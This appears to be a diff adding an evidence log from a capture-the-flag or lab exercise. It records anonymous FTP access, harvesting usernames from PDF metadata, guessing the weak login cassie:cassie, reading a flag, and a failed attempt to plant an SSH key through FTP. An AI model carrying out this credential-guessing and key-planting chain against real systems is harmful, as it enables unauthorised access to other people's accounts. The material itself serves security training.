@@ -1,0 +1,99 @@
+================================================================================
+evidence_ftp.txt — anonymous FTP and document metadata
+================================================================================
+
+[1] Anonymous session
+--------------------------------------------------------------------------------
+$ ftp -an 192.168.161.157
+Connected to 192.168.161.157.
+220 (vsFTPd 3.0.5)
+331 Please specify the password.
+230 Login successful.
+ftp> ls -la
+drwxr-xr-x    3 0        0            4096 Nov 02  2022 .
+drwxr-xr-x    3 0        0            4096 Nov 02  2022 ..
+drwxr-xr-x    2 114      120          4096 Nov 02  2022 backup
+
+
+[2] /backup contents
+--------------------------------------------------------------------------------
+ftp> cd backup
+250 Directory successfully changed.
+ftp> ls
+BROCHURE-TEMPLATE.pdf
+CALENDAR-TEMPLATE.pdf
+FUNCTION-TEMPLATE.pdf
+NEWSLETTER-TEMPLATE.pdf
+REPORT-TEMPLATE.pdf
+
+
+[3] exiftool — the fields that carry a person
+--------------------------------------------------------------------------------
+$ exiftool -Author -Creator -CreatorTool -Producer -CreateDate -ModifyDate \
+           -LastModifiedBy -Company -Title -Subject *.pdf
+
+======== BROCHURE-TEMPLATE.pdf
+Creator Tool                    : Microsoft® Word 2016
+Create Date                     : 2022:11:02 11:07:40+02:00
+Producer                        : Microsoft® Word 2016
+
+======== CALENDAR-TEMPLATE.pdf
+Creator Tool                    : Microsoft® Word 2016
+Create Date                     : 2022:11:02 11:34:14+02:00
+Producer                        : Microsoft® Word 2016
+
+======== FUNCTION-TEMPLATE.pdf
+Creator                         : Cassie
+Creator Tool                    : Microsoft® Word 2016
+Create Date                     : 2022:11:02 11:38:02+02:00
+Producer                        : Microsoft® Word 2016
+
+======== NEWSLETTER-TEMPLATE.pdf
+Creator                         : Mark
+Creator Tool                    : Microsoft® Word 2016
+Create Date                     : 2022:11:02 11:11:56+02:00
+Producer                        : Microsoft® Word 2016
+
+======== REPORT-TEMPLATE.pdf
+Creator                         : Robert
+Creator Tool                    : Microsoft® Word 2016
+Create Date                     : 2022:11:02 11:08:26+02:00
+Producer                        : Microsoft® Word 2016
+
+Summary: REPORT -> Robert, NEWSLETTER -> Mark, FUNCTION -> Cassie.
+BROCHURE and CALENDAR have the author fields stripped.
+
+
+[4] Nine attempts (3 names x 3 case variants)
+--------------------------------------------------------------------------------
+$ python3 charlie_ftp_credtest_7f3a.py -H 192.168.161.157
+[+] VALID  cassie:cassie
+[*] pwd = /home/cassie
+[*] files: local.txt
+[*] dirs : -
+===== local.txt =====
+9c3006bdea469fa32aace984f50acc19
+[*] Reuse the same pair on SSH: ssh cassie@192.168.161.157
+
+Cassie / CASSIE were also accepted for the same account later.
+
+
+[5] Write attempts — read-only service
+--------------------------------------------------------------------------------
+ftp> mkdir .ssh
+550 Permission denied.
+ftp> put charlie.pub -o .ssh/authorized_keys
+550 Permission denied.
+ftp> quote SITE CHMOD 600 .ssh/authorized_keys
+500 Unknown SITE command.
+
+vsftpd is configured with write_enable=NO: STOR/MKD/APPE all return 550 and SITE CHMOD is
+not implemented. FTP is a read primitive only.
+
+
+[6] Flag
+--------------------------------------------------------------------------------
+local.txt (as cassie) = 9c3006bdea469fa32aace984f50acc19
+
+================================================================================
+End of file.
